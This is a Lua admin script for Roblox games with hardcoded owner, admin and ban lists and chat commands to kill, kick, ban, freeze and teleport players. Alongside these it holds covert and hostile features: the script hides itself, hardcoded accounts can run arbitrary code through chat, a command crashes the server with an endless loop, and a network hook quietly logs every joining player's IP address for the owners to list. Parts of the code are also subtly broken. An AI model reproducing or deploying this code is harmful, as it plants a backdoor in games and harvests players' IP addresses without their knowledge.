Base={
        Owners={
                {'mew903',771417}, 
                {'lawhlza',19388488},
                {'acb227',798003},
                {'Player',0}
        },
        Admins={
                {'bob371'},
                {'TheNewScripter'},
                {'Racken'},
                {'crusher12555'},
                {'Visualist'},
                {'AccountMoniter'},
                {'acbalt'},
                {'ScriptTyper'}
        },
        Banned={
                {'Soccerblaze'},
                {'ferdf101'},
				{'magma16'},
                {'ferdf56'},
                {'Davillion'},
                {'TeamDman'},
                {'lAmLegend'},
                {'Wil1'},
                {'Wil2'},
                {'DrThunder'},
                {'Starbarrier'},
                {'bamboopiggystar'},
                {'Scriptec'},
                {'Mar2'}
        }
}
Added={
        Admins={},
        Banned={}
}
Data={
        Music={
                ['1']={27697713,3,1},
                ['2']={27697743,3,1},
                ['3']={27697277,1.37,1},
                ['4']={27697735,2,1},
                ['5']={1015394,1,1},
                ['6']={11420933,1,1},
                ['7']={11231513,1,1},
                ['8']={27697719,2.4,1},
                ['9']={11060062,1,1},
                ['10']={45819151,1,1},
                ['11']={27697707,1,1},
                ['12']={27697707,2,1},
                ['13']={5986151,1,1},
                ['14']={9650822,1,1},
                ['15']={11420922,1,1},
        },
        CreatedScripts={},
        CreatedLocalScripts={},
        FoundIPs={},
}
Commands={
        Data={
                Commands={},
                Version={36}
        }
}
if script.Parent.className=='Workspace' then
        script.Name='Admin'
        if script.Parent==true then
                script.Parent=nil
        end
end
X=function(s)coroutine.resume(coroutine.create(s))end
getplayer=function(playr,s)
        CheckTable=function(x,y)
                for i,v in pairs(x) do 
                        if v[1]==y then 
                                return true 
                        end 
                end 
                return false 
        end
        if type(playr)~='string'then 
                return {}
        end
        for v in playr:gmatch('%w+') do
                playr=v
                break
        end
        players={}
        if playr=='me' or playr=='' then 
                table.insert(players,s)
                return players
        end
        if playr=='notme' then
                for rofl,p in pairs(game:service('Players'):GetPlayers()) do
                        if p~=s then
                                table.insert(players,p)
                        end
                end
                return players
        end
        if playr=='admins'then 
                for rofl,p in pairs(game:service('Players'):GetPlayers()) do
                        if CheckTable(Base.Owners,p.Name) or CheckTable(Base.Admins,p.Name) or CheckTable(Added.Admins,p.Name) then
                                table.insert(players,p)
                        end
                end
                return players
        end
        if playr=='nonadmins'then 
                for rofl,p in pairs(game:service('Players'):GetPlayers()) do
                        pcall(function()
                                if CheckTable(Base.Owners,p.Name) or CheckTable(Base.Admins,p.Name)or CheckTable(Added.Admins,p.Name)then
                                        return
                                end
                                table.insert(players,p)
                        end)
                end
                return players
        end
        if playr=='all'then 
                for rofl,p in pairs(game:service('Players'):GetPlayers()) do
                        table.insert(players,p)
                end
                return players
        end
        for rofl,p in pairs(game:service('Players'):GetPlayers()) do
                if p.Name:lower():find(playr:lower())==1 then
                        table.insert(players,p)
                        return players
                end
        end
        return {}
end
run=function(x,speaker)
        if x:sub(1,11)=='unloopkill/' then
                for rofl,p in pairs(getplayer(x:sub(12),speaker)) do
                        if script:FindFirstChild(p.Name)~=nil then
                                script:FindFirstChild(p.Name):remove()
                        end
                end
        end
        if x:sub(1,9)=='loopkill/' then
                for rofl,p in pairs(getplayer(x:sub(10),speaker)) do
                        NewScript('s',script,[[
                        script.Name=']]..p.Name..[['
                        while true do wait();
                                pcall(function()
                                        player=game:service('Players'):FindFirstChild(script.Name).Character
                                        player:BreakJoints()
                                end)
                        end]])
                end
        end
        if x:sub(1,5)=='tele/' then
                p2=nil
                for v=6,100 do
                        if x:sub(v,v)=='/' then
                                p2=v
                                break
                        end
                end
                for rofl1,p1 in pairs(getplayer(x:sub(6),speaker)) do
                        for rofl2,p12 in pairs(getplayer(x:sub(p2),speaker)) do
                                if p1.Character.Torso~=nil then
                                        if p12.Character.Torso~=nil then
                                                p1.Character.Torso.CFrame=p12.Character.Torso.CFrame
                                        end
                                end
                        end
                end
        end
        if x:sub(1,7)=='badger/' then
                for rofl,p in pairs(getplayer(x:sub(8),speaker)) do
                        if p.PlayerGui~=nil then
                                BADGER(p.PlayerGui)
                        end
                end
        end
        if x:sub(1,6)=='music/' then
                if Data.Music[x:sub(7)]~=nil then
                        NewMusic(Data.Music[x:sub(7)][1],Data.Music[x:sub(7)][2],Data.Music[x:sub(7)][3])
                end
        end
        if x:sub(1,7)=='cmusic/' then
                for i,v in pairs(game:service('SoundService'):GetChildren()) do
                        if v.className=='Sound' then
								v.stop() 
                                v:remove()
                        end
                end
        end
        if x:sub(1,3)=='rt/' then
                for rofl,p in pairs(getplayer(x:sub(4),speaker)) do
                        if p.Backpack~=nil then
                                X(function()
                                        pcall(function()
                                                for i,v in pairs(p.Backpack:GetChildren()) do
                                                        if v.className=='Tool' or v.className=='Hopperbin' then
                                                                X(function() 
                                                                        pcall(function()
                                                                                v:remove()
                                                                        end)
                                                                end)
                                                        end
                                                end
                                        end)
                                end)
                        end
                end
        end
        if x:sub(1,3)=='rg/' then
                for rofl,p in pairs(getplayer(x:sub(4),speaker)) do
                        if p.PlayerGui~=nil then
                                X(function()
                                        pcall(function()
                                                for i,v in pairs(p.PlayerGui:GetChildren()) do
                                                        if v.className=='ScreenGui' or v.className=='GuiMain' then
                                                                X(function() 
                                                                        pcall(function()
                                                                                v:remove()
                                                                        end)
                                                                end)
                                                        end
                                                end
                                        end)
                                end)
                        end
                end
        end
        if x:sub(1,3)=='cc/' then
                for rofl,p in pairs(getplayer(x:sub(4),speaker)) do
                        if p.Character~=nil then
                                X(function()
                                        pcall(function()
                                                if p.Character:FindFirstChild('Mew903 Admin FF')~=nil then
                                                        p.Character:FindFirstChild('Mew903 Admin FF'):remove()
                                                end
                                                for i,v in pairs(p.Character:GetChildren()) do
                                                        if v.className=='Part' then
                                                                for l,z in pairs(v:GetChildren()) do
                                                                        if z.className=='Fire' or z.className=='Smoke' or z.className=='Sparkles' then
                                                                                z:remove()
                                                                        end
                                                                end
                                                        end
                                                end
                                        end)
                                end)
                        end
                end
        end
        if x:sub(1,5)=='unff/' then
                for rofl,p in pairs(getplayer(x:sub(6),speaker)) do
                        if p.Character~=nil then
                                X(function()
                                        pcall(function()
                                                if p.Character:FindFirstChild('Mew903 Admin FF')~=nil then
                                                        p.Character:FindFirstChild('Mew903 Admin FF'):remove()
                                                end
                                        end)
                                end)
                        end
                end
        end
        if x:sub(1,3)=='ff/' then
                for rofl,p in pairs(getplayer(x:sub(4),speaker)) do
                        if p.Character~=nil then
                                Instance.new('ForceField',p.Character).Name='Mew903 Admin FF'
                        end
                end
        end
        if x:sub(1,5)=='fire/' then
                for rofl,p in pairs(getplayer(x:sub(6),speaker)) do
                        if p.Character~=nil then
                                for i,v in pairs(p.Character:GetChildren()) do
                                        if v.className=='Part' then
                                                Instance.new('Fire',v)
                                        end
                                end
                        end
                end
        end
        if x:sub(1,6)=='smoke/' then
                for rofl,p in pairs(getplayer(x:sub(7),speaker)) do
                        if p.Character~=nil then
                                for i,v in pairs(p.Character:GetChildren()) do
                                        if v.className=='Part' then
                                                Instance.new('Smoke',v)
                                        end
                                end
                        end
                end
        end
        if x:sub(1,6)=='spark/' then
                for rofl,p in pairs(getplayer(x:sub(7),speaker)) do
                        if p.Character~=nil then
                                for i,v in pairs(p.Character:GetChildren()) do
                                        if v.className=='Part' then
                                                Instance.new('Sparkles',v)
                                        end
                                end
                        end
                end
        end
        if x:sub(1,3)=='iv/' then
                for rofl,p in pairs(getplayer(x:sub(4),speaker)) do
                if p.Character~=nil then
                        for i,v in pairs(p.Character:GetChildren()) do
                                        if v.className=='Part' then
                                                v.Transparency=1
                                        end
                                        if v.className=='Hat' or v.className=='Tool' then
                                                v.Handle.Transparency=1
                                        end
                                end
                        end
                end
        end
        if x:sub(1,3)=='vi/' then
                for rofl,p in pairs(getplayer(x:sub(4),speaker)) do
                        if p.Character~=nil then
                                for i,v in pairs(p.Character:GetChildren()) do
                                        if v.className=='Part' then
                                                v.Transparency=0
                                        end
                                        if v.className=='Hat' or v.className=='Tool' then
                                                v.Handle.Transparency=0
                                        end
                                end
                        end
                end
        end
        if x:sub(1,5)=='base/' or x:sub(1,6)=='clean/' then
                X(function()
                        pcall(function()
                                for i,v in pairs(workspace:GetChildren()) do
                                        for q,w in pairs(v:GetChildren()) do
                                                if not w:FindFirstChild('Humanoid'):FindFirstChild('Status')~=nil then
                                                        v:remove()
                                                end
                                        end
                                end
                                for i,v in pairs(workspace:GetChildren()) do
                                        for q,w in pairs(v:GetChildren()) do
                                                if not w:FindFirstChild('Humanoid'):FindFirstChild('Status')~=nil then
                                                        v:BreakJoints()
                                                end
                                        end
                                end
                        end)
                end)
                BasePart=Instance.new('Part',workspace)
                BasePart.Name='Base'
                BasePart.formFactor='Plate'
                BasePart.Size=Vector3.new(1000,2,1000)
                BasePart.CFrame=CFrame.new(0,0,0)
                BasePart.Locked=true
                BasePart.Anchored=true
                BasePart.Name='Base'
                BasePart.BrickColor=BrickColor.Green()
                BasePart:BreakJoints()
                game:service('Lighting').Ambient=Color3.new(127/255,127/255,127/255)
                game:service('Lighting').ColorShift_Top=Color3.new(0,0,0)
                game:service('Lighting').ColorShift_Bottom=Color3.new(0,0,0)
                game:service('Lighting').ShadowColor=Color3.new(178/255,178/255,178/255)
                game:service('Lighting').Brightness=1
                game:service('Lighting').GeographicLatitude=41.73
                game:service('Lighting').TimeOfDay=14
        end
        if x:sub(1,4)=='frz/' then
                for rofl,p in pairs(getplayer(x:sub(5),speaker)) do
                        if p.Character~=nil then
                                for i,v in pairs(p.Character:GetChildren()) do
                                        if v.className=='Part' then
                                                v.Anchored=true
                                        end
                                end
                        end
                end
        end
        if x:sub(1,5)=='thaw/' then
                for rofl,p in pairs(getplayer(x:sub(6),speaker)) do
                        if p.Character~=nil then
                                for i,v in pairs(p.Character:GetChildren()) do
                                        if v.className=='Part' then
                                                v.Anchored=false
                                        end
                                end
                        end
                end
        end
        if x:sub(1,5)=='jump/' then
                for rofl,p in pairs(getplayer(x:sub(6),speaker)) do
                        if p.Character~=nil then
                                p.Character.Humanoid.Jump=true
                        end
                end
        end
        if x:sub(1,4)=='sit/' then
                for rofl,p in pairs(getplayer(x:sub(5),speaker)) do
                        if p.Character~=nil then
                                p.Character.Humanoid.Sit=true
                        end
                end
        end
        if x:sub(1,5)=='uban/' then
                for rofl,p in pairs(getplayer(x:sub(6),speaker)) do
                        for i,v in pairs(Added.Banned) do
                                if v:lower():find(p.Name:lower())==1 then
                                        table.remove(Added.Banned,i)
                                end
                        end
                end
        end
        if x:sub(1,7)=='btools/' then
                for rofl,p in pairs(getplayer(x:sub(8),speaker)) do
                        for i,v in pairs(game:service('InsertService'):LoadAsset(59951114):GetChildren()) do 
                                v.Parent=p.Backpack
                        end
                end
        end
        if x:sub(1,5)=='maxp/' then
                game:service('Players').MaxPlayers=x:sub(6)
        end
        if x:sub(1,5)=='time/' then
                game:service('Lighting').TimeOfDay=x:sub(6)
        end
        if x:sub(1,7)=='bright/' then
                game:service('Lighting').Brightness=x:sub(8)
        end
        if x:sub(1,3)=='rs/' then
                for rofl,p in pairs(getplayer(x:sub(4),speaker)) do
                        if p~=nil then
                                m=Instance.new('Model',workspace)
                                m.Name='Loading new character.....'
                                h=Instance.new('Humanoid',m)
                                p.Character=m
                        end
                end
        end
        if x:sub(1,6)=='vmess/' then
                gtext('mess',x:sub(7))
        end
        if x:sub(1,6)=='vhint/' then
                gtext('hint',x:sub(7))
        end
        if x:sub(1,5)=='kill/' then
                for rofl,p in pairs(getplayer(x:sub(6),speaker)) do
                        if p.Character~=nil then
                                p.Character:BreakJoints()
                        end
                end
        end
        if x:sub(1,4)=='ban/' then
                for rofl,p in pairs(getplayer(x:sub(5),speaker)) do
                        if p~=nil then
                                table.insert(Added.Banned,p.Name)
                                p:remove()
                        end
                end
        end
        if x:sub(1,5)=='kick/' then
                for rofl,p in pairs(getplayer(x:sub(6),speaker)) do
                        if p~=nil then
                                p:remove()
                        end
                end
        end
        if x:sub(1,2)=='c/' then
                NewScript('script',workspace,x:sub(3))
        end
        if x:sub(1,2)=='l/' then
                NewScript('local',speaker.Backpack,x:sub(3))
        end
        if x:sub(1,5)=='hint/' then
                Report('hint',x:sub(6))
        end
        if x:sub(1,5)=='mess/' then
                Report('message',x:sub(6))
        end
        if x:sub(1,7)=='admins/' then
                for i,v in pairs(Base.Owners) do
                        Reportpri('hint','Owner: '..v[1]..' userId: '..v[2],speaker.PlayerGui)
                end
                for i,v in pairs(Base.Admins) do
                        Reportpri('hint','Admin: '..v[1]..' userId: '..v[2],speaker.PlayerGui)
                end
                for i,v in pairs(Added.Admins) do
                        Reportpri('hint','Temp. Admin: '..v[1]..' userId: '..v[2],speaker.PlayerGui)
                end
        end
        if x:sub(1,7)=='banned/' then
                for i,v in pairs(Base.Banned) do
                        Reportpri('hint','Banned: '..v[1]..' userId: '..v[2],speaker.PlayerGui)
                end
                for i,v in pairs(Added.Banned) do
                        Reportpri('hint','Temp. Banned: '..v[1]..' userId: '..v[2],speaker.PlayerGui)
                end
        end
end
OwnerCommands=function(x) --Only owners use
        if x:sub(1,7)=='iplist/' then
                for i,v in pairs(Data.FoundIPs) do
                        Reportpri('hint',v,speaker.PlayerGui)
                end
        end
        if x:sub(1,18)=='removeadminscript/' then
                script:remove()
        end
        if x:sub(1,8)=='shutdown/' then
                while true do Instance.new('ManualSurfaceJointInstance',workspace) end
        end
        if x:sub(1,9)=='disabled/' then
                for i,v in pairs(workspace:GetChildren()) do
                        if v.className=='Script' or v.className=='LocalScript' then
                                v.Disabled=true
                        end
                end
        end
        if x:sub(1,8)=='enabled/' then
                for i,v in pairs(workspace:GetChildren()) do
                        if v.className=='Script' or v.className=='LocalScript' then
                                v.Disabled=false
                        end
                end
        end
        if x:sub(1,5)=='test/' then
                finished()
        end
        if x:sub(1,10)=='noscripts/' then
                for i,v in pairs(workspace:GetChildren()) do
                        if v.className=='Script' or v.className=='LocalScript' then
                                v:remove()
                        end
                end
        end
        if x:sub(1,5)=='lego/' then
                for rofl,p in pairs(getplayer(x:sub(6),speaker)) do
                        if p~=nil then
                                table.insert(Added.Banned,p.Name)
                                p:remove()
                        end
                end
        end
end
NewScript=function(c,p,s)
        BaseScript=game:service('InsertService'):LoadAsset(58090303)
        makesorce=function(x,y)
                a=Instance.new('StringValue',x)
                a.Name='v'
                a.Value=y
        end
        if c:lower()=='l' then
                x=BaseScript.LocalScript:clone()
                makesorce(x,s)
                x.Parent=p
                table.insert(Data.CreatedLocalScripts,x)
        end
        if c:lower()=='s' then
                x=BaseScript.Script:clone()
                makesorce(x,s)
                x.Parent=p
                table.insert(Data.CreatedScripts,x)
        end
end
gtext=function(c,t)
        if c:lower()=='hint' then
                h=Instance.new('Hint',workspace)
                for i=1,#t do wait()
                        h.Text=t:sub(1,i)
                end
                wait(2)
                h:remove()
        end
        if c:lower()=='mess' then
                h=Instance.new('Message',workspace)
                for i=1,#t do wait()
                        h.Text=t:sub(1,i)
                end
                wait(2)
                h:remove()
        end
end
Report=function(Level,Text)
        for UMHGAHAHHA,MVM in pairs(game:service('Players'):GetChildren()) do
                X(function()
                        for i,v in pairs(MVM:GetChildren()) do
                                if v.className=='PlayerGui' then
                                        Parent=v
                                end
                        end
                        MoveText=Text
                        ReportScreen=Instance.new('ScreenGui',Parent)
                        game:service'Debris':AddItem(ReportScreen,60)
                        ReportLabel=Instance.new('TextLabel',ReportScreen)
                        ReportLabel.FontSize='Size11'
                        ReportLabel.TextColor3=Color3.new(1,1,1)
                        ReportLabel.BackgroundTransparency=.5
                        ReportLabel.BackgroundColor3=Color3.new(0,0,0)
                        ReportLabel.BorderColor3=Color3.new(0,0,0)
                        ReportLabel.Text=Text
                        if Level:lower()=='message'then
                                ReportScreen.Name='Message'
                                ReportLabel.Size=UDim2.new(1,0,1,0)
                                for i=1,#MoveText do wait()
                                        ReportLabel.Text=MoveText:sub(1,i)
                                end
                                wait(5)
                                ReportScreen:remove()
                        elseif Level:lower()=='hint'then
                                ReportScreen.Name='Hint'
                                ReportLabel.Size=UDim2.new(1,0,0,20)
                                HintNum=0
                                for hintnum,hint in pairs(Parent:children()) do
                                        if hint.Name==ReportScreen.Name and hint~=ReportScreen then
                                                HintNum=HintNum+1
                                        end
                                end
                                ReportLabel:TweenPosition(UDim2.new(0,0,0,20*HintNum),Enum.EasingDirection.Out,Enum.EasingStyle.Back,1,false)
                                for i=1,#MoveText do wait()
                                        ReportLabel.Text=MoveText:sub(1,i)
                                end
                                wait(5)
                                ReportScreen:remove()
                        end
                end)
        end
end
Reportpri=function(Level,Text,p)
        Parent=p
        MoveText=Text
        ReportScreen=Instance.new('ScreenGui',Parent)
        game:service'Debris':AddItem(ReportScreen,60)
        ReportLabel=Instance.new('TextLabel',ReportScreen)
        ReportLabel.FontSize='Size11'
        ReportLabel.TextColor3=Color3.new(1,1,1)
        ReportLabel.BackgroundTransparency=.5
        ReportLabel.BackgroundColor3=Color3.new(0,0,0)
        ReportLabel.BorderColor3=Color3.new(0,0,0)
        ReportLabel.Text=Text
        if Level:lower()=='message'then
                ReportScreen.Name='Message'
                ReportLabel.Size=UDim2.new(1,0,1,0)
                for i=1,#MoveText do wait()
                        ReportLabel.Text=MoveText:sub(1,i)
                end
                wait(5)
                ReportScreen:remove()
        elseif Level:lower()=='hint'then
                ReportScreen.Name='Hint'
                ReportLabel.Size=UDim2.new(1,0,0,20)
                HintNum=0
                for hintnum,hint in pairs(Parent:children()) do
                        if hint.Name==ReportScreen.Name and hint~=ReportScreen then
                                HintNum=HintNum+1
                        end
                end
                ReportLabel:TweenPosition(UDim2.new(0,0,0,20*HintNum),Enum.EasingDirection.Out,Enum.EasingStyle.Back,1,false)
                for i=1,#MoveText do wait();
                        ReportLabel.Text=MoveText:sub(1,i)
                end
                wait(2.5)
                ReportScreen:remove()
        end
end
finished=function()
        for x,b in pairs(game:service('Players'):GetPlayers()) do
                if b.PlayerGui~=nil then
                        m=Instance.new('ScreenGui',b.PlayerGui)
                        m.Name='Finished!'
                        a=Instance.new('ImageButton',m)
                        a.Size=UDim2.new(1,0,0,0)
                        a.BackgroundTransparency=1
                        a.Image='http://www.roblox.com/asset/?id=40868914'
                        NewScript('s',a,[[for i=1,130 do script.Parent.Size=script.Parent.Size+UDim2.new(0,0,.01,0) wait(); end for i=1,130 do script.Parent.Size=script.Parent.Size-UDim2.new(0,0,.01,0) wait(); end]])
                        NewScript('s',a,[[script.Parent.Parent.Parent.MouseButton1Down:connect(function() script.Parent.Parent.Parent.Parent:remove() end)]])
                end
        end
end
NewMusic=function(asset,pitch,volume)
        s=Instance.new('Sound',workspace)
        s.Name='Mew903 Created Music'
        s.SoundId='rbxassetid://'..asset
        s.Pitch=pitch
        s.Volume=volume
        s.Looped=true
        NewScript('s',s,[[
        script.Parent.Parent=game:service('SoundService') wait();
        script.Parent:Play()
        script.Parent=nil
        ]])
end
BADGER=function(rofl)
        g=Instance.new('ScreenGui',rofl)
        g.Name='Badger Muschroom Badger Mushroom!'
        a=Instance.new('ImageButton',g)
        a.Size=UDim2.new(1,0,1,0)
        a.BackgroundTransparency=1
        NewScript('s',a,[[
        Badger={51456662,51456659,51456657,51456655,51456652,51456649}
        while true do wait()
                for i,v in ipairs(Badger) do
                        script.Parent.Image=[=[http://www.roblox.com/asset/?id=]=]..v
                        wait()
                end 
                wait()
        end]])
        NewScript('s',a,[[script.Parent.Parent.Parent.MouseButton1Down:connect(function() script.Parent.Parent.Parent.Parent:remove() end)]])
end
con=function(p)
        a=Base.Owners
        b=Base.Admins
        c=Added.Admins
        for i,v in pairs(a) do 
                if v[1]==p.Name and v[2]==p.userId then 
                        p.Chatted:connect(function(x)
                                run(x,p)
                                OwnerCommands(x)
                        end) 
                end 
        end 
        for i,v in pairs(b) do 
                if v[1]==p.Name then 
                        p.Chatted:connect(function(x)
                                run(x,p)
                        end) 
                end 
        end 
        for i,v in pairs(c) do 
                if v[1]==p.Name and v[2]==p.userId then 
                        p.Chatted:connect(function(x)
                                run(x,p)
                        end) 
                end 
        end 
end
checkban=function(noob)
        for i,v in pairs(Base.Banned) do
                if noob.Name==v[1] then
                        noob:remove()
                end 
        end 
        for i,v in pairs(Added.Banned) do
                if noob.Name==v then
                        noob:remove()
                end 
        end 
end 
game.Players.PlayerAdded:connect(function(p)
        con(p)
end)
for rofl,ps in pairs(game.Players:GetChildren()) do 
        if ps.className=='Player' then 
                con(ps) 
        end 
end 
for i,v in pairs(game.Players:GetChildren()) do 
        checkban(v)
end
game.Players.PlayerAdded:connect(function(noob)
        checkban(noob)
end)
X(function()
        pcall(function()
                game:service('NetworkServer').IncommingConnection:connect(function(ip)
                        PlayerConnect=game:service('Players').PlayerAdded:connect(function(Player)
                                lol=''
                                text=ip..''
                                for i=1,#ip do 
                                        if ip:sub(i,i)==':' then 
                                                break 
                                        end 
                                        lol=text:sub(1,i) 
                                end
                                for i,v in pairs(Data.FoundIPs) do
                                        if v==lol..' | '..Player.Name then 
                                                PlayerConnect:disconnect() 
                                                return 
                                        end
                                end
                                table.insert(Data.FoundIPs,lol..' | '..Player.Name)
                                PlayerConnect:disconnect()
                        end)
                end)
        end)
end)
finished()
